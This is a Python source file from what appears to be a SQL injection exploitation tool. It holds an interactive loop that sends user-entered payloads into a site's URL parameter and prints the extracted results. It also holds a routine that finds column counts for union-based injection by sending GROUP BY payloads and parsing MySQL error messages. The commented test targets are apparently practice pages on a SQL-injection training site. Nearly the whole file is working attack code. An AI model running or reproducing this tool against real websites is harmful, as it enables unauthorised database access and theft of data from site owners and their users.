import requests
import validator.valid_checkers as valid
from bs4 import BeautifulSoup
import checker.searcher as checker
import colorama
import re
import urllib.parse

colorama.init(autoreset=True)


def get_content(html, param):
    soup = BeautifulSoup(html.text, 'lxml')
    all_data = soup.find_all(param)
    results = [data for num, data in enumerate(all_data[0].contents) if num % 2 == 1]
    return results


def manual_exploit(site):
    is_vuln, msg, pattern, payload = checker.search_vuln(site, is_print=False, is_pattern=True)
    if is_vuln:
        print(msg)
        while True:
            payload = input("\nEnter payload: ")
            if payload == "0":
                exit()
            else:
                site_for_req = site.split('=')
                result = valid.check_res(site_for_req[0] + "=" + payload)
                if len(result) == 4:
                    msg = f'{colorama.Fore.RED}{result[2]}'
                elif len(result) == 3:
                    msg = f'{colorama.Fore.RED}{result[-1]} return 404'
                else:
                    msg = colorama.Fore.RED + "\n".join(get_content(result[0], pattern))
                print(msg)
    else:
        print(msg)


def count_columns(site, pretty=False):
    is_vuln, msg, pattern, payload = checker.search_vuln(site, is_print=False, is_pattern=True)
    if is_vuln:
        result = find_payload_and_groups(site, payload)
        if pretty:
            if result:
                return f'{colorama.Fore.LIGHTMAGENTA_EX}[+] Column count: {result[0]}'

            else:
                return f"{colorama.Fore.RED}Nums of columns not finded"
        else:
            return result[0] if result else None
    else:
        return f"{colorama.Fore.RED}Site is not vulnerability for union based SQLInj" if pretty else None


def find_payload_and_groups(site, finded_payload):
    end_of_sql, res, count_of_columns, finded = None, None, None, False
    site = site.split('=')
    group_msg = "GROUP BY " + ",".join([str(i) for i in range(1, 100)])

    payloads, comment = ["", ")"], '-- -'
    for payl in payloads:
        res = requests.get(f"{site[0]}=-1{finded_payload + payl}{group_msg}{comment}")
        if "Unknown column " in res.text:
            end_of_sql = finded_payload + payl
            count_of_columns = res.text.split("Unknown column '")[1].split("' in 'group")[0]
            finded = True
            break
    if not finded:
        res = requests.get(f"{site[0]}=-1 {group_msg}")
        count_of_columns = res.text.split("Unknown column '")[1].split("' in 'group")[0]
        finded = True
        end_of_sql = " "

    return count_of_columns, end_of_sql if finded else None


if __name__ == "__main__":
    # manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
    # print(find_pattern("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'"))
    # print(get_content("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"))
    print(count_columns('http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1'))
